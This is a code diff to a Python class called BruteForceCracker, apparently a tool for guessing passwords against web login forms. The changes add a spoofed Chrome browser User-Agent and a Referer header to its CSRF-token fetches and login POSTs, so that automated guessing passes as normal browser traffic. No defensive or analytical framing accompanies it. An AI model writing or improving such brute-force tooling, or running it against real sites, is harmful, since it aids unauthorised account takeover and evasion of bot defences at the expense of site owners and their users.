@@ -37,13 +37,16 @@ class BruteForceCracker:
         self.username_field = username_field
         self.password_field = password_field
         self.csrf_detected = False
+        self.headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        }
         
         # Display banner without sleep
         print(banner)
 
     def get_csrf_token(self, session):
         try:
-            response = session.get(self.url)
+            response = session.get(self.url, headers=self.headers)
             # Try to extract token using BeautifulSoup
             soup = BeautifulSoup(response.content, 'html.parser')
             
@@ -91,8 +94,12 @@ class BruteForceCracker:
             data_dict[token_name] = token_value
         
         try:
+            # Prepare headers for the attempt
+            headers = self.headers.copy()
+            headers['Referer'] = self.url
+
             # Make the login attempt
-            response = session.post(self.url, data=data_dict)
+            response = session.post(self.url, data=data_dict, headers=headers)
 
             # Check status code first - 403 usually means CSRF failure or Forbidden
             if response.status_code == 403 or response.status_code >= 500:
